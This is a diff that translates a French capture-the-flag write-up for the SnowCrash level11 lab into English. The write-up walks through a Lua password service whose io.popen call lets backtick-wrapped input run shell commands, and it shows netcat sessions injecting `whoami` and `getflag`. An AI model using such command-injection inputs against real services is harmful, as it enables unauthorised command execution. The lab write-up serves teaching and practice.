@@ -1,4 +1,4 @@
-On trouve dans le dossier **home** un fichier **level11.lua** qui contient :
+In the folder **home** there is a file **level11.lua** that contains :
 
 ```lua
 #!/usr/bin/env lua
@@ -31,23 +31,23 @@ while 1 do
 end
 ```
 
-On observe que le programme est lancé sur **127.0.0.1:5151**, donc pour pouvoir interagir avec on utilise :
+We observe that the program is launched on **127.0.0.1:5151**, so in order to be able to interact with it we use :
 <pre><code>> nc 127.0.0.1 5151
 Password:
 Erf nope..</code></pre>
 
-En regardant le programme de plus près, on se rend compte qu'une injection est possible <code>io.popen("echo "..pass.." | sha1sum", "r")</code> car il exécute la variable **pass**, qui est notre input.
-De plus la deuxième partie du code ne sert à rien car peut importe le mot de passe, le programme se termine par un simple message.
-> Le bon mot de passe est: **NotSoEasy** (rajouter un -n devant pour que cela fonctionne)
+Looking at the program more closely, we realize that an injection is possible <code>io.popen("echo "..pass..." | sha1sum", "r")</code> because it executes the variable **pass**, which is our input.
+Moreover the second part of the code is useless because no matter what the password is, the program ends with a simple message.
+> The correct password is: **NotSoEasy** (add a -n in front to make it work)
 
-On essaie :
+We're trying :
 <pre><code>> nc 127.0.0.1 5151
 Password: `whoami > /tmp/test`
 Erf nope..
 level11@SnowCrash:~$ cat /tmp/test
 flag11
 </code></pre>
-> On stocke le résultat dans un fichier car sinon il n'y a pas d'affichage : il ne s'agit pas d'un <code>client:send()</code>
+> We store the result in a file because otherwise there is no display: it is not a <code>client:send()</code>
 
 <pre><code>> nc 127.0.0.1 5151
 Password: `getflag > /tmp/test`
